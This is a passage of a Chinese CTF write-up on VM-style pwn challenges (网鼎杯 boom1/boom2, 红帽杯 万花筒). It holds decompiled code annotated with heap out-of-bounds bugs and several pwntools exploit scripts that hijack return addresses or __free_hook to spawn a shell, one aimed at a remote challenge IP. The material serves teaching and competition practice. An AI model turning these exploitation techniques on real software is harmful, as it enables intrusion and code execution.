+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x53</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x99</span><span class="s1">'</span>
+    <span class="n">Add</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="n">Start</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"heap base =&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+    <span class="c1">#get shell</span>
+    <span class="n">fake_heap</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x56559aaf</span><span class="o">-</span><span class="mh">0x56559000</span><span class="p">)</span>
+    <span class="n">fake_heap1</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x56559abc</span><span class="o">-</span><span class="mh">0x56559000</span><span class="p">)</span>
+    <span class="n">fake_heap2</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x56559ac9</span><span class="o">-</span><span class="mh">0x56559000</span><span class="p">)</span>
+    <span class="n">fake_heap3</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x56559ad6</span><span class="o">-</span><span class="mh">0x56559000</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">fake_heap</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x76</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">malloc</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">fake_heap1</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x76</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">malloc</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">fake_heap2</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x76</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">malloc</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">fake_heap3</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x76</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">malloc</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x54</span><span class="p">)</span><span class="o">+</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
+    <span class="n">data</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x99</span><span class="s1">'</span>
+    <span class="n">Add</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="n">Start</span><span class="p">()</span>
+    <span class="nb">raw_input</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">shell</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">))</span>
+    <span class="nb">raw_input</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">((</span><span class="n">shell</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">))</span>
+    <span class="nb">raw_input</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">((</span><span class="n">shell</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">))</span>
+    <span class="nb">raw_input</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p8</span><span class="p">((</span><span class="n">shell</span><span class="o">&gt;&gt;</span><span class="mi">24</span><span class="p">)))</span>
+    <span class="c1">#gdb.attach(p,'b* 0x56555000+ 0xcaf')</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'3'</span><span class="p">)</span>
+
+
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">exp</span><span class="p">()</span>
+</pre></div>
+<h3 data-content="1" id="08428f6ad96f27cd1fa8cadf32ac0090">网鼎杯青龙组boom2</h3>
+<h4 data-content="1" id="beb752b0fcaa7c157b67cc871f017fc8">程序逻辑</h4>
+<p>main函数的开始部分分配了两个大小为<code>0x40000uLL</code>的堆块，因为大于了默认的heap分配阈值，调用mmap分配内存，在堆地址中存储了一个栈地址。</p>
+<div class="highlight"><pre><span></span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+<span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+<span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+<span class="n">chunk_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40000uLL</span><span class="p">);</span><span class="c1">// &gt;0x23000,mmap</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40000uLL</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"MC execution system</span><span class="se">\n</span><span class="s">Input your code&gt; "</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x120uLL</span><span class="p">);</span>
+<span class="n">chunk_addr</span> <span class="o">+=</span> <span class="mh">0x8000</span><span class="p">;</span>
+<span class="n">chunk_8000_addr</span> <span class="o">=</span> <span class="n">chunk_addr</span><span class="p">;</span>
+<span class="o">--</span><span class="n">chunk_addr</span><span class="p">;</span>
+<span class="o">*</span><span class="n">chunk_addr</span> <span class="o">=</span> <span class="mh">0x1ELL</span><span class="p">;</span>
+<span class="o">--</span><span class="n">chunk_addr</span><span class="p">;</span>
+<span class="o">*</span><span class="n">chunk_addr</span> <span class="o">=</span> <span class="mh">0xDLL</span><span class="p">;</span>
+<span class="n">v4</span> <span class="o">=</span> <span class="n">chunk_addr</span><span class="p">;</span>
+<span class="o">--</span><span class="n">chunk_addr</span><span class="p">;</span>
+<span class="o">*</span><span class="n">chunk_addr</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+<span class="o">--</span><span class="n">chunk_addr</span><span class="p">;</span>
+<span class="o">*</span><span class="n">chunk_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>       <span class="c1">// 这里放了栈地址进去</span>
+<span class="n">chunk_8000_addr_sub_1</span> <span class="o">=</span> <span class="n">chunk_addr</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+<span class="o">*</span><span class="n">chunk_8000_addr_sub_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span>  <span class="c1">// 堆里保存了自己的地址</span>
+<span class="n">v37</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</pre></div>
+<p>整个虚拟机只能执行一次，且最多执行30条指令，这里依然是只分析重点的指令，其他包括<code>v36和*chunk_8000_addr_sub_1</code>的<code>add/sub/mul/div/&gt;&gt;/&amp;/^</code>等运算，不一而足。</p>
+<p>0x0的指令存在一个明显的堆越界读，将数据赋值给v36。</p>
+<p>0x6的指令存在同样的问题，只不过赋值的对象变成了<code>chunk_8000_addr_sub_1</code>。</p>
+<p>0x9指令将v36作为地址取值再赋给v36。</p>
+<p>0x11指令为v36的双重取值再赋值。</p>
+<p>0x13指令执行<code>*chunk_8000_addr_sub_1 = v36</code>，这条指令将v36和chunk_8000_addr_sub_1关联了起来。</p>
+<div class="highlight"><pre><span></span><span class="c1">//choice=0</span>
+<span class="n">buf2</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span><span class="c1">// choice为0</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+<span class="n">v36</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">chunk_8000_addr</span><span class="p">[</span><span class="o">*</span><span class="n">buf2</span><span class="p">];</span><span class="c1">// v7可控的话这里有堆越界</span>
+<span class="c1">//choice=1</span>
+<span class="n">buf3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span><span class="c1">// choice=1</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+<span class="n">v36</span> <span class="o">=</span> <span class="o">*</span><span class="n">buf3</span><span class="p">;</span><span class="c1">// 取buf值赋值给v36</span>
+<span class="c1">// choice=6</span>
+<span class="n">chunk_8000_addr_sub_2</span> <span class="o">=</span> <span class="n">chunk_8000_addr_sub_1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+<span class="o">*</span><span class="n">chunk_8000_addr_sub_2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">chunk_8000_addr</span><span class="p">;</span>
+<span class="n">chunk_8000_addr</span> <span class="o">=</span> <span class="n">chunk_8000_addr_sub_2</span><span class="p">;</span>
+<span class="n">buf4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+<span class="n">chunk_8000_addr_sub_1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">chunk_8000_addr_sub_2</span><span class="p">[</span><span class="o">-*</span><span class="n">buf4</span><span class="p">];</span><span class="c1">// （注意要乘8）前溢将堆地址赋值给这个值</span>
+<span class="c1">//choice=9</span>
+<span class="n">v36</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v36</span><span class="p">;</span><span class="c1">//取8字节v36地址上的值赋给v36</span>
+<span class="c1">//choice=11</span>
+<span class="n">v13</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int64</span> <span class="o">**</span><span class="p">)</span><span class="n">chunk_8000_addr_sub_1</span><span class="p">;</span><span class="c1">// v13先放一个map地址，这个地址的值是retn_addr</span>
+<span class="o">++</span><span class="n">chunk_8000_addr_sub_1</span><span class="p">;</span>
+<span class="o">**</span><span class="n">v13</span> <span class="o">=</span> <span class="n">v36</span><span class="p">;</span><span class="c1">//两次取值，赋值为一个可控值</span>
+<span class="c1">//choice=13</span>
+<span class="o">--</span><span class="n">chunk_8000_addr_sub_1</span><span class="p">;</span><span class="c1">//把v36写到堆上</span>
+<span class="o">*</span><span class="n">chunk_8000_addr_sub_1</span> <span class="o">=</span> <span class="n">v36</span><span class="p">;</span><span class="c1">// 先让v36得到我们的那个目标值</span>
+</pre></div>
+<h4 data-content="1" id="17feed4518ba9c4f2b2674957a00ae4d">漏洞利用</h4>
+<p>这里没有输出函数，我们考虑将返回地址的<code>__libc_start_main</code>函数直接拷贝到map地址，通过加运算得到<code>one_gadget</code>。</p>
+<p>将map上的原栈地址进行加减运算得到<code>retn_addr</code>，再用双重赋值指令把<code>one_gadget</code>写入到<code>retn_addr</code>。在exp注释中详细解释了每一条指令的目的。</p>
+<div class="highlight"><pre><span></span><span class="c1">#coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">rud</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'DEBUG'</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span><span class="s1">'split'</span><span class="p">,</span><span class="s1">'-h'</span><span class="p">]</span>
+<span class="n">debug</span> <span class="o">=</span> <span class="mi">2</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc6_2.23-0ubuntu10_amd64.so'</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">debug</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">gadgets</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xcd0f3</span><span class="p">,</span><span class="mh">0xcd1c8</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf02b0</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">,</span><span class="mh">0xf66f0</span><span class="p">]</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">debug</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="n">gadgets</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span> <span class="mh">0x4526a</span><span class="p">,</span> <span class="mh">0xf02a4</span><span class="p">,</span> <span class="mh">0xf1147</span><span class="p">]</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">'LD_PRELOAD'</span><span class="p">:</span><span class="s1">'./libc6_2.23-0ubuntu10_amd64.so'</span><span class="p">})</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'182.92.73.10'</span><span class="p">,</span><span class="mi">36642</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="c1">#environ+0xf0 = retn_addr</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x7ffff7a0d000</span>
+    <span class="n">shell_addr</span> <span class="o">=</span> <span class="n">gadgets</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__libc_start_main'</span><span class="p">]</span><span class="o">+</span><span class="mi">240</span>
+    <span class="n">off</span> <span class="o">=</span> <span class="n">shell_addr</span> <span class="o">-</span> <span class="n">target</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">off</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Input your code&gt; "</span><span class="p">)</span>
+    <span class="c1">#gdb.attach(p,'b* 0x0000555555554000+0xb72')</span>
+    <span class="c1">#gdb.attach(p,'b* 0x0000555555554000+0xe43')</span>
+    <span class="c1">#set args = bin_sh</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="c1">#set v36 = map_addr(stack_addr on it)</span>
+        <span class="mi">9</span><span class="p">,</span><span class="c1">#set v36 = stack_addr</span>
+        <span class="mi">6</span><span class="p">,</span><span class="mh">0x101e0</span><span class="p">,</span><span class="c1">#set chunk_8000_addr_sub_1</span>
+        <span class="mi">25</span><span class="p">,</span><span class="c1">#set v36 = retn_addr</span>
+        <span class="mi">6</span><span class="p">,</span><span class="o">-</span><span class="mh">0x101e3</span><span class="p">,</span><span class="c1">#set chunk_8000_addr_sub_1 = map_addr</span>
+        <span class="mi">13</span><span class="p">,</span><span class="c1">#set map_addr(retn_addr)</span>
+        <span class="mi">9</span><span class="p">,</span><span class="c1">#set v36 = libc_start_main+240</span>
+        <span class="mi">6</span><span class="p">,</span><span class="mh">0x101e0</span><span class="p">,</span><span class="c1">#set map_addr</span>
+        <span class="mi">25</span><span class="p">,</span><span class="c1">#set v36 = one_gadget</span>
+        <span class="mi">6</span><span class="p">,</span><span class="o">-</span><span class="mh">0x101e1</span><span class="p">,</span><span class="c1">#set chunk_8000_addr_sub_1 = map_addr</span>
+        <span class="mi">11</span><span class="p">,</span><span class="c1">#set retn_addr(one_gadget)</span>
+        <span class="p">])</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">26</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="o">-</span><span class="mh">0xe8</span><span class="p">,</span><span class="n">off</span><span class="p">,</span><span class="mh">0x12345678</span>
+        <span class="p">])</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">exp</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="39c70c8c8175522056ca367c03a6114e">编译器类VM</h2>
+<p>这类VM主要接收用户的高级语言形式的代码，模拟编译执行，相比于汇编类的VM，它更加灵活，难度也更高，做题没有固定的套路，需要自己结合题目环境解题。</p>
+<h3 data-content="1" id="8e40b1889f36186d987dcdec7398bac7">2019红帽杯-万花筒</h3>
+<h4 data-content="1" id="4ac1725c9b697aa99ce31e072772cc1d">程序逻辑 &amp;&amp; 漏洞利用</h4>
+<p>题目是用llvm自己实现的一个小型编译器，是llvmcookbook的示例改的，toy语言，看Kaleidoscope这个名字应该就可以找到教程，gettok里定义了一些标识符，在划分语元的时候使用，这里有def、extern、if等。</p>
+<p>在引用未定义的函数会提示<code>Error: Unknown function referenced</code>, 假如我们定义一个名称与库函数相同且没有body的函数(如<code>def system(a);</code>), 第一次调用提示<code>Error: Unknown unary operator</code>, 之后能调用到库函数，因此我们调用<code>mmap</code>分配一块固定内存地址存放<code>/bin/sh</code>，之后调用<code>sytem(map_addr)</code>来get shell。</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./pwn2"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"def mmap(a b c d e f);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"mmap(1,1,1,1,1,1);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"def read(a b c);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"read(1,1,1);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"mmap("</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">)</span><span class="o">+</span><span class="s2">","</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="o">+</span><span class="s2">",3,34,0,0);"</span><span class="p">)</span> 
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"read(0,65536,20);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"def system(a);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"system(0);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"ready&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"system(65536);"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<h3 data-content="1" id="c0c50e5e8f52137937fec7b7042ef6a5">2020网鼎杯青龙组-boom1</h3>
+<h4 data-content="1" id="6b3aa57e0aabfa923d417fbb7acfdad2">程序逻辑 &amp;&amp; 漏洞利用</h4>
+<p>这道题目也是一道编译器类的VM，程序限制我们只能进行一次函数调用，在调试过程中可以发现存储我们指令的内存地址是通过map得到的，因此其地址和libc地址偏移是固定的，我们可以定义一个变量，从这个变量的地址寻址到<code>__free_hook</code>和<code>system</code>函数，将后者覆写到前者，再调用<code>free('/bin/sh')</code>即可。</p>
+<div class="highlight"><pre><span></span><span class="c1">#coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
